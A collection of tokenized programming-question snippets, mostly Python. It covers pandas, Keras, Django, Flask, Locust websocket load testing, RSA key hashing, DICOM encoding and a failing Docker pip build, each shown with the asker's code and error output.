"class SocketClient ( object ) : def __init__ ( self , host ) : self.host = host self.session_id = uuid4 ( ) .hex def connect ( self ) : self.ws = websocket.WebSocket ( ) self.ws.settimeout ( 10 ) self.ws.connect ( self.host ) events.quitting += self.on_close data = self.attach_session ( { } ) return data def attach_session ( self , payload ) : message_id = uuid4 ( ) .hex start_time = time.time ( ) e = None try : print ( `` Sending payload { } '' .format ( payload ) ) data = self.send_with_response ( payload ) assert data [ 'mykey ' ] except AssertionError as exp : e = exp except Exception as exp : e = exp self.ws.close ( ) self.connect ( ) elapsed = int ( ( time.time ( ) - start_time ) * 1000 ) if e : events.request_failure.fire ( request_type='sockjs ' , name='send ' , response_time=elapsed , exception=e ) else : events.request_success.fire ( request_type='sockjs ' , name='send ' , response_time=elapsed , response_length=0 ) return data def send_with_response ( self , payload ) : json_data = json.dumps ( payload ) g = gevent.spawn ( self.ws.send , json_data ) g.get ( block=True , timeout=2 ) g = gevent.spawn ( self.ws.recv ) result = g.get ( block=True , timeout=10 ) json_data = json.loads ( result ) return json_data def on_close ( self ) : self.ws.close ( ) class ActionsTaskSet ( TaskSet ) : @ task def streams ( self ) : response = self.client.connect ( ) logger.info ( `` Connect Response : { } '' .format ( response ) ) class WSUser ( Locust ) : task_set = ActionsTaskSet min_wait = 1000 max_wait = 3000 def __init__ ( self , *args , **kwargs ) : super ( WSUser , self ) .__init__ ( *args , **kwargs ) self.client = SocketClient ( 'wss : //mydomain.amazonaws.com/endpoint ' )"
"data = read.csv ( 'big.csv ' ) for id , new_df in data.groupby ( level=0 ) : # look at mini df and do some analysis # some code for each of the small data frames d = pd.DataFrame ( ) # new df to populateprint 'Start of the loop'for id , new_df in data.groupby ( level=0 ) : c = [ new_df.iloc [ i : ] for i in range ( len ( new_df.index ) ) ] x = pd.concat ( c , keys=new_df.index ) .reset_index ( level= ( 2,3 ) , drop=True ) .reset_index ( ) x = x.set_index ( [ 'level_0 ' , 'level_1 ' , x.groupby ( [ 'level_0 ' , 'level_1 ' ] ) .cumcount ( ) ] ) d = pd.concat ( [ d , x ] ) data = pd.read_csv ( 'https : //raw.githubusercontent.com/skiler07/data/master/so_data.csv ' , index_col=0 ) .set_index ( [ 'id ' , 'date ' ] )"
"from six.moves import cPicklefrom keras.models import Sequentialfrom keras.layers import Dense , Dropout , Activationfrom keras.utils import np_utilsfrom keras.optimizers import RMSprop # GlobalsNUM_CLASSES = 2NUM_EPOCHS = 10BATCH_SIZE = 250def loadData ( ) : fData = open ( 'data.pkl ' , 'rb ' ) fLabels = open ( 'labels.pkl ' , 'rb ' ) data = cPickle.load ( fData ) labels = cPickle.load ( fLabels ) train_data = data [ 0:2000 ] train_labels = labels [ 0:2000 ] test_data = data [ 2000 : ] test_labels = labels [ 2000 : ] return ( train_data , train_labels , test_data , test_labels ) # Load data and corresponding labels for modeltrain_data , train_labels , test_data , test_labels = loadData ( ) train_labels = np_utils.to_categorical ( train_labels , NUM_CLASSES ) test_labels = np_utils.to_categorical ( test_labels , NUM_CLASSES ) print ( train_data.shape ) print ( test_data.shape ) model = Sequential ( ) model.add ( Dense ( 512 , input_shape= ( 5625 , ) ) ) model.add ( Activation ( 'relu ' ) ) model.add ( Dropout ( 0.2 ) ) model.add ( Dense ( 512 ) ) model.add ( Activation ( 'relu ' ) ) model.add ( Dropout ( 0.2 ) ) model.add ( Dense ( 2 ) ) model.add ( Activation ( 'softmax ' ) ) model.summary ( ) model.compile ( loss='categorical_crossentropy ' , optimizer=RMSprop ( ) , metrics= [ 'accuracy ' ] ) history = model.fit ( train_data , train_labels , validation_data= ( test_data , test_labels ) , batch_size=BATCH_SIZE , nb_epoch=NUM_EPOCHS , verbose=1 ) score = model.evaluate ( test_data , test_labels , verbose=0 ) print ( 'Test score : ' , score [ 0 ] ) print ( 'Test accuracy : ' , score [ 1 ] ) Error when checking model input : expected dense_input_1 to have 2 dimensions , but got array with shape ( 2000 , 75 , 75 )"
try : artist = Artist.objects.get ( id=id ) except : raise Http404artist = Artist.objects.filter ( id=id ) if not artist : return HttpResponse ( '404 ' )
"def test_t1 ( when_creating_a_project_from_a_sales_handoff , with_a_new_customer , and_no_conflicting_data_exists , create_project ) : it_will_create_a_customer_with_the_releavant_information ( ) it_will_create_a_project_that_references_the_newly_created_customer ( ) when_creating_a_project_from_a_sales_handoffwith_a_new_customerand_no_conflicting_data_existscreate_project @ fixturedef namer ( request ) : request.node.name = 'test_foo '"
"import matplotlib.pyplot as pltimport numpy as npx= np.arange ( 0,100 ) y= 3*x-1plt.plot ( x , y ) plt.xlabel ( ' x ' , fontdict= { `` name '' : `` Times New Roman '' } ) plt.ylabel ( ' y ' , fontdict= { `` name '' : `` Times New Roman '' } ) plt.show ( )"
"[ [ 'Harry ' , ' 4 ' ] , [ 'Anthony ' , '10 ' ] , [ 'Adam ' , ' 7 ' ] , [ 'Joe ' , ' 6 ' ] , [ 'Ben ' , '10 ' ] ] # we can say the first element in it 's lists is ` name ` , the second is ` score ` [ [ 'Anthony ' , '10 ' ] , [ 'Ben ' , '10 ' ] , [ 'Adam ' , ' 7 ' ] , [ 'Joe ' , ' 6 ' ] , [ 'Harry ' , ' 4 ' ] ] > > > sorted ( l , key=lambda x : ( int ( x [ 1 ] ) , x [ 0 ] ) ) [ [ 'Harry ' , ' 4 ' ] , [ 'Joe ' , ' 6 ' ] , [ 'Adam ' , ' 7 ' ] , [ 'Anthony ' , '10 ' ] , [ 'Ben ' , '10 ' ] ] > > > sorted ( l , key=lambda x : ( int ( x [ 1 ] ) , x [ 0 ] ) , reverse=True ) [ [ 'Ben ' , '10 ' ] , [ 'Anthony ' , '10 ' ] , [ 'Adam ' , ' 7 ' ] , [ 'Joe ' , ' 6 ' ] , [ 'Harry ' , ' 4 ' ] ]"
"[ Mon Aug 06 19:18:38 2012 ] [ error ] [ client : :1 ] File does not exist : /srv/http/webchat/src/_publish_message , referer : http : //localhost:88/webchat/chat function publish_message ( e ) { e.preventDefault ( ) ; $ .post ( '/_publish_message ' , { 'message ' : `` user 's message taken from a text field '' } ) .fail ( Handler.publish_error ) ; } < VirtualHost *:88 > ServerName webchat.dev WSGIDaemonProcess webchat user=http group=http threads=5 WSGIScriptAlias /webchat /srv/http/webchat/src/webchat.wsgi WSGIScriptReloading On DocumentRoot /srv/http/webchat/src < Directory /srv/http/webchat/src > WSGIProcessGroup webchat WSGIApplicationGroup % { GLOBAL } Order deny , allow Allow from all < /Directory > < /VirtualHost > import syssys.path.insert ( 0 , '/srv/http/webchat/src ' ) from index import app as application"
"import numpy as npimport globimport cv2from cv2 import imreaddir = `` ../images/faces94/**/**.jpg '' files = list ( glob.iglob ( dir , recursive=True ) ) img = np.zeros ( imread ( files [ 0 ] ,0 ) .shape ) img = img.astype ( 'int ' ) for i in range ( len ( files ) ) : img += imread ( files [ i ] ,0 ) .astype ( 'int ' ) img = np.divide ( img , len ( files ) *2 ) # HERE you can change it to np.divide ( img , len ( files ) ) in order to see bad resultimg = np.mod ( img,128 ) img = img.astype ( np.int8 ) cv2.imshow ( `` image '' , img ) cv2.waitKey ( 0 )"
bash % ./aaa.py & bash % ./bbb.py &
"> > > def foo ( ) : ... lst = [ ] ... for i in range ( 4 ) : ... lst.append ( lambda : i ) ... print ( [ f ( ) for f in lst ] ) ... > > > foo ( ) [ 3 , 3 , 3 , 3 ] > > > def foo ( ) : ... lst = [ ] ... for i in range ( 4 ) : ... lst.append ( ( lambda a : lambda : a ) ( i ) ) ... print ( [ f ( ) for f in lst ] ) ... > > > foo ( ) [ 0 , 1 , 2 , 3 ]"
main.py/eggs/spam.py
"# IN TESTS.PYclass OrderTests ( TestCase , ShopTest ) : _VIEW = views.order def test_gateway_answer ( self ) : url = 'whatever url ' request = self.request_factory ( url , 'GET ' ) self._VIEW ( request , ** { 'sku ' : order.sku } ) # IN VIEWS.PYdef order ( request , sku ) ..."
"from warehouse2.controllers import importServerimportServer.runServer ( 60 ) def runServer ( sleep_secs ) : try : imp = ImportserverController ( ) while ( True ) : imp.runImport ( ) sleepFor ( sleep_secs ) except Exception , e : log.info ( `` Unexpected error : % s '' % sys.exc_info ( ) [ 0 ] ) log.info ( e ) 2008-09-25 12:31:12.687000 Could not locate a bind configured on mapper Mapper|ImportJob|n_imports , SQL expression or this Session"
"> > > with open ( 'out.txt ' , ' w ' ) as fout : ... fout.write ( 'foo bar ' ) ... > > > with open ( 'out.txt ' , ' w ' ) as fout : ... print > > fout , 'foo bar ' ..."
"import pandas as pdimport numpy as npfrom multiprocessing import Pool # method # 1def foo ( i ) : return data [ i ] if __name__ == '__main__ ' : data = pd.Series ( np.array ( range ( 100000 ) ) ) pool = Pool ( 2 ) print pool.map ( foo , [ 10,134,8,1 ] ) # method # 2def foo ( ( data , i ) ) : return data [ i ] if __name__ == '__main__ ' : data = pd.Series ( np.array ( range ( 100000 ) ) ) pool = Pool ( 2 ) print pool.map ( foo , [ ( data,10 ) , ( data,134 ) , ( data,8 ) , ( data,1 ) ] ) # method # 3def foo ( ( data , i ) ) : return data [ i ] if __name__ == '__main__ ' : data = pd.Series ( np.array ( range ( 100000 ) ) ) pool = Pool ( 2 ) # reduce the size of the argument passed data1 = data [ :1000 ] print pool.map ( foo , [ ( data1,10 ) , ( data1,134 ) , ( data1,8 ) , ( data1,1 ) ] )"
"> > > sorted ( [ 1 , 2 , None , 4.5 , ( -sys.maxint - 1 ) , ( sys.maxint - 1 ) , 'abc ' ] , reverse=True ) [ 'abc ' , 9223372036854775806 , 4.5 , 2 , 1 , -9223372036854775808 , None ] > > > > > > sorted ( [ 1 , 2 , None , 4.5 , ( -sys.maxint - 1 ) , ( sys.maxint - 1 ) , 'abc ' ] ) [ None , -9223372036854775808 , 1 , 2 , 4.5 , 9223372036854775806 , 'abc ' ] > > >"
"Label1 Label2 Label3key1 col1value1 col2value1key2 col1value2 col2value2key3 col1value3 col2value3dict1 = df.set_index ( 'Label1 ' ) .to_dict ( ) my_dict = { key1 : [ col1value1 , col2value1 ] , key2 : [ col1value2 , col2value2 ] , key3 : [ col1value3 , col2value3 ] }"
"def log_msg ( log_type ) : msg = 'Operation successful ' if log_type == 'file ' : log_file.write ( msg ) elif log_type == 'database ' : cursor.execute ( 'INSERT INTO log_table ( MSG ) VALUES ( ' ? ' ) ' , msg ) class FileLogger ( object ) : def log ( self , msg ) : log_file.write ( msg ) class DbLogger ( object ) : def log ( self , msg ) : cursor.execute ( 'INSERT INTO log_table ( MSG ) VALUES ( ' ? ' ) ' , msg ) def log_msg ( obj ) : msg = 'Operation successful ' obj.log ( msg ) if log_type == 'file ' : log_msg ( FileLogger ( ) ) elif : log_type == 'database ' : log_msg ( DbLogger ( ) )"
"class Car ( db.Model ) : name = models.CharField ( max_length=256 ) color = models.CharField ( max_length=256 ) { 'name ' : 'BMW ' , 'color ' : 'Blue ' , 'link ' : { 'self ' : '/api/cars/1 ' } } { 'name ' : 'BMW ' , 'color ' : 'Blue ' } class CarHandler ( AnonymousBaseHandler ) : allowed_methods = ( 'GET ' , ) model = Car fields = ( 'name ' , 'color ' , ) def read ( self , request , car_id ) : return Car.get ( pk=car_id )"
"rsa_cipher = PKCS1_v1_5.new ( RSA.importKey ( pub_rsa_key ) ) hashlib.sha1 ( rsa_cipher._key.exportKey ( `` DER '' ) ) .hexdigest ( ) -- -- -BEGIN PUBLIC KEY -- -- -MII ... AB -- -- -END PUBLIC KEY -- -- - # Python 3.7 using Cryptographyfrom cryptography.hazmat.primitives import serializationwith open ( 'pub_key.perm ' , 'rb ' ) as key_file : public_key = serialization.load_pem_public_key ( key_file.read ( ) , backend=default_backend ( ) ) pub_der = public_key.public_bytes ( encoding=serialization.Encoding.DER , format=serialization.PublicFormat.PKCS1 ) print ( sha1 ( pub_der ) .hexdigest ( ) ) # gives `` d291c142648b7 ... ... ..c2f4676f4213203c4bd '' # Python 2.7 using PyCryptofrom Crypto.Cipher import PKCS1_v1_5from Crypto.PublicKey import RSAwith open ( 'pub_key.perm ' , ' r ' ) as key_file : public_key = RSA.importKey ( key_file.read ( ) ) pub_der = public_key.exportKey ( 'DER ' ) # this assumes PKCS1 by default per the __doc__print ( sha1 ( pub_der ) .hexdigest ( ) ) # gives `` bb070664079f5 ... ... ..64c97fcadbad847cce9 ''"
"# using mysql-connector-python-rfimport osimport mysql.connectorcon = mysql.connector.connect ( option_files=os.path.expanduser ( '~/.mylogin.cnf ' ) ) # using pymysqlimport osimport pymysqlcon = pymysql.connect ( option_files=os.path.expanduser ( '~/.mylogin.cnf ' ) ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -UnicodeDecodeError Traceback ( most recent call last ) < ipython-input-64-d17e56ef7010 > in < module > ( ) -- -- > 1 con = mysql.connector.connect ( option_files=os.path.expanduser ( '~/.mylogin.cnf ' ) ) /usr/local/lib/python3.5/site-packages/mysql/connector/__init__.py in connect ( *args , **kwargs ) 140 # Option files 141 if 'option_files ' in kwargs : -- > 142 new_config = read_option_files ( **kwargs ) 143 return connect ( **new_config ) 144 /usr/local/lib/python3.5/site-packages/mysql/connector/optionfiles.py in read_option_files ( **config ) 66 config [ 'option_files ' ] = [ config [ 'option_files ' ] ] 67 option_parser = MySQLOptionsParser ( list ( config [ 'option_files ' ] ) , -- - > 68 keep_dashes=False ) 69 del config [ 'option_files ' ] 70 /usr/local/lib/python3.5/site-packages/mysql/connector/optionfiles.py in __init__ ( self , files , keep_dashes ) 162 self.files = files 163 -- > 164 self._parse_options ( list ( self.files ) ) 165 self._sections = self.get_groups_as_dict ( ) 166 /usr/local/lib/python3.5/site-packages/mysql/connector/optionfiles.py in _parse_options ( self , files ) 193 `` than once in the list '' .format ( file_ ) ) 194 with open ( file_ , ' r ' ) as op_file : -- > 195 for line in op_file.readlines ( ) : 196 if line.startswith ( ' ! includedir ' ) : 197 _ , dir_path = line.split ( None , 1 ) /usr/local/Cellar/python3/3.5.1/Frameworks/Python.framework/Versions/3.5/lib/python3.5/encodings/ascii.py in decode ( self , input , final ) 24 class IncrementalDecoder ( codecs.IncrementalDecoder ) : 25 def decode ( self , input , final=False ) : -- - > 26 return codecs.ascii_decode ( input , self.errors ) [ 0 ] 27 28 class StreamWriter ( Codec , codecs.StreamWriter ) : UnicodeDecodeError : 'ascii ' codec ca n't decode byte 0x96 in position 28 : ordinal not in range ( 128 )"
In [ 1 ] : unicode_str = 'Příliš žluťoučký kůň úpěl ďábelské ódy'In [ 2 ] : unicode_strOut [ 2 ] : 'Příliš žluťoučký kůň úpěl ďábelské ódy'In [ 3 ] : encoded_str = unicode_str.encode ( `` UTF-8 '' ) In [ 4 ] : encoded_strOut [ 4 ] : b ' P\xc5\x99\xc3\xadli\xc5\xa1 \xc5\xbelu\xc5\xa5ou\xc4\x8dk\xc3\xbd k\xc5\xaf\xc5\x88 \xc3\xbap\xc4\x9bl \xc4\x8f\xc3\xa1belsk\xc3\xa9 \xc3\xb3dy'In [ 5 ] : bad_str = str ( encoded_str ) In [ 6 ] : bad_strOut [ 6 ] : `` b ' P\\xc5\\x99\\xc3\\xadli\\xc5\\xa1 \\xc5\\xbelu\\xc5\\xa5ou\\xc4\\x8dk\\xc3\\xbd k\\xc5\\xaf\\xc5\\x88 \\xc3\\xbap\\xc4\\x9bl \\xc4\\x8f\\xc3\\xa1belsk\\xc3\\xa9 \\xc3\\xb3dy ' '' In [ 7 ] : new_encoded_str = some_magical_function_here ( bad_str ) ? ? ?
"class PlaceIcon ( Widget ) : def __init__ ( self , image_path , **kwargs ) : super ( PlaceIcon , self ) .__init__ ( **kwargs ) self.bind ( size=self.adjust_size ) self.image = Image ( source=image_path ) self.image_path = image_path def adjust_size ( self , *args ) : ( a , b ) = self.image.texture.size ( x , y ) = self.size ( x1 , y1 ) = self.pos if x > y : scale = x/a else : scale = y/b x1 -= ( scale*a-x ) /2 y1 -= ( scale*b-y ) /2 with self.canvas : self.canvas.clear ( ) self.background = Rectangle ( texture=self.image.texture , pos= ( x1 , y1 ) , size= ( scale*a , scale*b ) )"
< script type= '' text/javascript '' src= '' https : //maps.googleapis.com/maps/api/js ? key=api_key & libraries=places & callback=ActivatePlacesSearch '' >
"import pandas as pdimport sysif sys.version_info [ 0 ] < 3 : from StringIO import StringIOelse : from io import StringIOCSV_Data = `` Index , Column_1 , Column_2 , Column_3 , Column_4 , Column_5 , Column_6 , Column_7 , Column_8\nindex_1,1.1,1.2,1.3,1.4,1.5,1.6,1.7,1.8\nindex_2,2.1,2.2,2.3,2.4,2.5,2.6,2.7,2.8\nindex_3,3.1,3.2,3.3,3.4,3.5,3.6,3.7,3.8\nindex_4,4.1,4.2,4.3,4.4,4.5,4.6,4.7,4.8 '' input_data = StringIO ( CSV_Data ) df = pd.DataFrame.from_csv ( path = input_data , header = 0 , sep= ' , ' , index_col=0 , encoding='utf-8 ' ) print ( df.to_dict ( orient = 'records ' ) )"
"min_coords = min_of_neighbors_coords ( x , y ) b [ x , y ] = a [ x , y ] * a [ min_coords ] ; d [ x , y ] = c [ min_coords ] ; 1 , 2 , 53 , 7 , 22 , 3 , 6"
def rounding ( funct ) : return round ( funct ) def rounding ( func ) :
"# import the necessary packagesfrom imutils import face_utilsimport numpy as npimport argparseimport imutilsimport dlibimport cv2 # construct the argument parser and parse the argumentsap = argparse.ArgumentParser ( ) ap.add_argument ( `` -p '' , `` -- shape-predictor '' , required=True , help= '' Path to facial landmark predictor '' ) ap.add_argument ( `` -i '' , `` -- image '' , required=True , help= '' Path to input image '' ) args = vars ( ap.parse_args ( ) ) # initialize dlib 's face detector ( HOG-based ) and then create the facial landmark predictordetector = dlib.get_frontal_face_detector ( ) predictor = dlib.shape_predictor ( args [ `` shape_predictor '' ] ) # load the input image , resize it , and convert it to grayscaleimage = cv2.imread ( args [ `` image '' ] ) image = imutils.resize ( image , width=500 ) gray = cv2.cvtColor ( image , cv2.COLOR_BGR2GRAY ) # detect faces in the grayscale imagerects = detector ( gray , 1 ) for ( i , rect ) in enumerate ( rects ) : # determine the facial landmarks for the face region , then # convert the landmark ( x , y ) -coordinates to a NumPy array shape = predictor ( gray , rect ) shape = face_utils.shape_to_np ( shape ) # loop over the face parts individually print ( face_utils.FACIAL_LANDMARKS_IDXS.items ( ) ) for ( name , ( i , j ) ) in face_utils.FACIAL_LANDMARKS_IDXS.items ( ) : print ( `` i = `` , i , `` j = `` , j ) # clone the original image so we can draw on it , then # display the name of the face part of the image clone = image.copy ( ) cv2.putText ( clone , name , ( 10 , 30 ) , cv2.FONT_HERSHEY_SIMPLEX , 0.7 , ( 0 , 0 , 255 ) , 2 ) # loop over the subset of facial landmarks , drawing the # specific face part using a red dots for ( x , y ) in shape [ i : j ] : cv2.circle ( clone , ( x , y ) , 1 , ( 0 , 0 , 255 ) , -1 ) # extract the ROI of the face region as a separate image ( x , y , w , h ) = cv2.boundingRect ( np.array ( [ shape [ i : j ] ] ) ) roi = image [ y : y+h , x : x+w ] roi = imutils.resize ( roi , width=250 , inter=cv2.INTER_CUBIC ) # show the particular face part cv2.imshow ( `` ROI '' , roi ) cv2.imwrite ( name + '.jpg ' , roi ) cv2.imshow ( `` Image '' , clone ) cv2.waitKey ( 0 ) # visualize all facial landmarks with a transparent overly output = face_utils.visualize_facial_landmarks ( image , shape ) cv2.waitKey ( 0 )"
myList.append ( 'Something ' ) myList.sort ( key=lambda s : s.lower ( ) )
"# ! /usr/bin/perluse strict ; use warnings ; use MIME : :Base64 ; use Storable qw/nfreeze/ ; my $ data = { 'string ' = > 'something ' , 'arrayref ' = > [ 1 , 2 , 'three ' ] , 'hashref ' = > { ' a ' = > ' b ' , } , } ; print encode_base64 ( nfreeze ( $ data ) ) ; # ! /usr/bin/env pythonimport base64import pprintimport sysdef magic_function ( frozen ) : # A miracle happens return thawedif __name__ == '__main__ ' : frozen = base64.b64decode ( sys.stdin.read ( ) ) data = magic_function ( frozen ) pprint.pprint ( data ) { 'string ' : 'something ' , 'arrayref ' : [ 1 , 2 , 'three ' ] , 'hashref ' : { ' a ' : ' b ' } }"
"from flask import Flaskimport prolog_handler as papp = Flask ( __name__ ) app.debug = False @ app.route ( '/ ' ) def hello ( ) : for rule in p.rules : print rule return 'hello'if __name__ == '__main__ ' : app.run ( host= ' 0.0.0.0 ' , port=8080 ) tstore = openPrologSession ( ) rules = ... def cleanUp ( ) : print `` Closing ... '' tstore.endSession ( ) atexit.register ( cleanUp )"
"import randomdef go ( ) : rounds = 0 while rounds < 5 : number = random.randint ( 1 , 5 ) if number == 1 : print ( ' a ' ) elif number == 2 : print ( ' b ' ) elif number == 3 : print ( ' c ' ) elif number == 4 : print ( 'd ' ) elif number == 5 : print ( ' e ' ) rounds = rounds + 1go ( ) eecbe aebcd"
"d = { 'High ' : [ 954 , 953 , 952 , 955 , 956 , 952 , 951 , 950 , ] } df = pandas.DataFrame ( d ) 'Max ' : [ 954 , 954 , 954 , 955 , 956 , 956 , 956 , 956 ]"
"import iofrom PIL import Image , ImageDrawfrom pydicom.dataset import Datasetfrom pydicom.uid import generate_uid , JPEGExtendedfrom pydicom._storage_sopclass_uids import SecondaryCaptureImageStorageWIDTH = 100HEIGHT = 100def ensure_even ( stream ) : # Very important for some viewers if len ( stream ) % 2 : return stream + b '' \x00 '' return streamdef bob_ross_magic ( ) : image = Image.new ( `` RGB '' , ( WIDTH , HEIGHT ) , color= '' red '' ) draw = ImageDraw.Draw ( image ) draw.rectangle ( [ 10 , 10 , 90 , 90 ] , fill= '' black '' ) draw.ellipse ( [ 30 , 20 , 70 , 80 ] , fill= '' cyan '' ) draw.text ( ( 11 , 11 ) , `` Hello '' , fill= ( 255 , 255 , 0 ) ) return imageds = Dataset ( ) ds.is_little_endian = Trueds.is_implicit_VR = Trueds.SOPClassUID = SecondaryCaptureImageStorageds.SOPInstanceUID = generate_uid ( ) ds.fix_meta_info ( ) ds.Modality = `` OT '' ds.SamplesPerPixel = 3ds.BitsAllocated = 8ds.BitsStored = 8ds.HighBit = 7ds.PixelRepresentation = 0ds.PhotometricInterpretation = `` RGB '' ds.Rows = HEIGHTds.Columns = WIDTHimage = bob_ross_magic ( ) ds.PixelData = ensure_even ( image.tobytes ( ) ) image.save ( `` output.png '' ) ds.save_as ( `` output-raw.dcm '' , write_like_original=False ) # File is OK # # Create compressed image # output = io.BytesIO ( ) image.save ( output , format= '' JPEG '' ) ds.PixelData = ensure_even ( output.getvalue ( ) ) ds.PhotometricInterpretation = `` YBR_FULL_422 '' ds.file_meta.TransferSyntaxUID = JPEGExtendedds.save_as ( `` output-jpeg.dcm '' , write_like_original=False ) # File is corrupt $ gdcmconv -J output-raw.dcm output-jpeg.dcm $ dcmdump output-jpeg.dcm # Dicom-File-Format # Dicom-Meta-Information-Header # Used TransferSyntax : Little Endian Explicit ( 0002,0000 ) UL 240 # 4 , 1 FileMetaInformationGroupLength ( 0002,0001 ) OB 00\01 # 2 , 1 FileMetaInformationVersion ( 0002,0002 ) UI =SecondaryCaptureImageStorage # 26 , 1 MediaStorageSOPClassUID ( 0002,0003 ) UI [ 1.2.826.0.1.3680043.8.498.57577581978474188964358168197934098358 ] # 64 , 1 MediaStorageSOPInstanceUID ( 0002,0010 ) UI =JPEGLossless : Non-hierarchical-1stOrderPrediction # 22 , 1 TransferSyntaxUID ( 0002,0012 ) UI [ 1.2.826.0.1.3680043.2.1143.107.104.103.115.2.8.4 ] # 48 , 1 ImplementationClassUID ( 0002,0013 ) SH [ GDCM 2.8.4 ] # 10 , 1 ImplementationVersionName ( 0002,0016 ) AE [ gdcmconv ] # 8 , 1 SourceApplicationEntityTitle # Dicom-Data-Set # Used TransferSyntax : JPEG Lossless , Non-hierarchical , 1st Order Prediction ... ... # # # How to do the magic below ? ... ( 7fe0,0010 ) OB ( PixelSequence # =2 ) # u/l , 1 PixelData ( fffe , e000 ) pi ( no value available ) # 0 , 1 Item ( fffe , e000 ) pi ff\d8\ff\ee\00\0e\41\64\6f\62\65\00\64\00\00\00\00\00\ff\c3\00\11 ... # 4492 , 1 Item ( fffe , e0dd ) na ( SequenceDelimitationItem ) # 0 , 0 SequenceDelimitationItem"
"# Invoking super class method without super ( ) .. Need to pass ` self ` as argumentclass Child ( Parent ) : def foo ( self ) : Parent.foo ( self ) # Invoking with super ( ) . # No need to pass ` self ` as argument to foo ( ) class Child ( Parent1 , Parent2 ) : def foo ( self ) : super ( Child , self ) .foo ( ) print 'Hi , I am Child-foo ( ) '"
"FROM python:2WORKDIR /usr/src/appCOPY requirements.txt ./RUN pip install -r requirements.txtCOPY . .CMD [ `` nosetests '' ] nosepyhivethriftsaslthrift_saslpython-dateutilfuturesix > =1.7.2 Failed building wheel for sasl Running setup.py clean for sasl Running setup.py bdist_wheel for thrift-sasl : started Running setup.py bdist_wheel for thrift-sasl : finished with status 'done ' Stored in directory : /root/.cache/pip/wheels/c8/3a/34/1d82df3d652788fc211c245d51dde857a58e603695ea41d93d Running setup.py bdist_wheel for future : started Running setup.py bdist_wheel for future : finished with status 'done ' Stored in directory : /root/.cache/pip/wheels/bf/c9/a3/c538d90ef17cf7823fa51fc701a7a7a910a80f6a405bf15b1aSuccessfully built pyhive thrift thrift-sasl futureFailed to build saslInstalling collected packages : nose , future , six , python-dateutil , pyhive , thrift , sasl , thrift-sasl Running setup.py install for sasl : started Running setup.py install for sasl : finished with status 'error ' Complete output from command /usr/local/bin/python -u -c `` import setuptools , tokenize ; __file__='/tmp/pip-install-Dd4Z7v/sasl/setup.py ' ; f=getattr ( tokenize , 'open ' , open ) ( __file__ ) ; code=f.read ( ) .replace ( '\r\n ' , '\n ' ) ; f.close ( ) ; exec ( compile ( code , __file__ , 'exec ' ) ) '' install -- record /tmp/pip-record-_rw4YI/install-record.txt -- single-version-externally-managed -- compile : running install running build running build_py creating build creating build/lib.linux-x86_64-2.7 creating build/lib.linux-x86_64-2.7/sasl copying sasl/__init__.py - > build/lib.linux-x86_64-2.7/sasl running egg_info writing requirements to sasl.egg-info/requires.txt writing sasl.egg-info/PKG-INFO writing top-level names to sasl.egg-info/top_level.txt writing dependency_links to sasl.egg-info/dependency_links.txt reading manifest file 'sasl.egg-info/SOURCES.txt ' reading manifest template 'MANIFEST.in ' writing manifest file 'sasl.egg-info/SOURCES.txt ' copying sasl/saslwrapper.cpp - > build/lib.linux-x86_64-2.7/sasl copying sasl/saslwrapper.h - > build/lib.linux-x86_64-2.7/sasl copying sasl/saslwrapper.pyx - > build/lib.linux-x86_64-2.7/sasl running build_ext building 'sasl.saslwrapper ' extension creating build/temp.linux-x86_64-2.7 creating build/temp.linux-x86_64-2.7/sasl gcc -pthread -fno-strict-aliasing -g -O2 -DNDEBUG -g -fwrapv -O3 -Wall -Wstrict-prototypes -fPIC -Isasl -I/usr/local/include/python2.7 -c sasl/saslwrapper.cpp -o build/temp.linux-x86_64-2.7/sasl/saslwrapper.o cc1plus : warning : command line option ‘ -Wstrict-prototypes ’ is valid for C/ObjC but not for C++ In file included from sasl/saslwrapper.cpp:254:0 : sasl/saslwrapper.h:22:23 : fatal error : sasl/sasl.h : No such file or directory # include < sasl/sasl.h > ^ compilation terminated . error : command 'gcc ' failed with exit status 1 -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Command `` /usr/local/bin/python -u -c `` import setuptools , tokenize ; __file__='/tmp/pip-install-Dd4Z7v/sasl/setup.py ' ; f=getattr ( tokenize , 'open ' , open ) ( __file__ ) ; code=f.read ( ) .replace ( '\r\n ' , '\n ' ) ; f.close ( ) ; exec ( compile ( code , __file__ , 'exec ' ) ) '' install -- record /tmp/pip-record-_rw4YI/install-record.txt -- single-version-externally-managed -- compile '' failed with error code 1 in /tmp/pip-install-Dd4Z7v/sasl/The command '/bin/sh -c pip install -r requirements.txt ' returned a non-zero code : 1"
"Projects + Project_1 + Project_2 - Project_3 - Lib1 __init__.py # empty moduleA.py - Tests __init__.py # empty foo_tests.py bar_tests.py setpath.py __init__.py # empty foo.py bar.py import osimport syssys.path.insert ( 0 , os.path.abspath ( '.. ' ) ) sys.path.insert ( 0 , os.path.abspath ( ' . ' ) ) sys.path.insert ( 0 , os.path.abspath ( ' ... ' ) ) import setpath # Annoyingly , PyCharm warns me that this is an unused import statementimport foo.py import setpathimport Project_3.foo.py # Errorfrom Project_3 import foo # Error"
"rot90=tf.reverse ( x , tf.convert_to_tensor ( ( False , False , True , False ) ) ) rot90=tf.transpose ( rot90 , ( [ 0,2,1,3 ] )"
"import numpy as nprefArray = np.random.random ( 16 ) ; myArray = np.random.random ( 1000 ) ; def find_nearest ( array , value ) : idx = ( np.abs ( array-value ) ) .argmin ( ) return idx ; for value in np.nditer ( myArray ) : index = find_nearest ( refArray , value ) ; print ( index ) ;"
"lst = [ { `` Name '' : 'Nick ' , 'Hour':0 , 'Value':2.75 } , { `` Name '' : 'Sam ' , 'Hour':1 , 'Value':7.0 } , { `` Name '' : 'Nick ' , 'Hour':0 , 'Value':2.21 } , { 'Name ' : 'Val ' , '' Hour '' :1 , 'Value':10.1 } , { 'Name ' : 'Nick ' , 'Hour':1 , 'Value':2.1 } , { 'Name ' : 'Val ' , '' Hour '' :1 , 'Value':11 } , ] finalList = collections.defaultdict ( float ) for info in lst : finalList [ info [ 'Name ' ] ] += info [ 'Value ' ] finalList = [ { 'Name ' : c , 'Value ' : finalList [ c ] } for c in finalList ] finalList = [ { `` Name '' : 'Nick ' , 'Hour':0 , 'Value':4.96 } , { `` Name '' : 'Sam ' , 'Hour':1 , 'Value':7.0 } , { 'Name ' : 'Val ' , '' Hour '' :1 , 'Value':21.1 } , { 'Name ' : 'Nick ' , 'Hour':1 , 'Value':2.1 } ... ]"
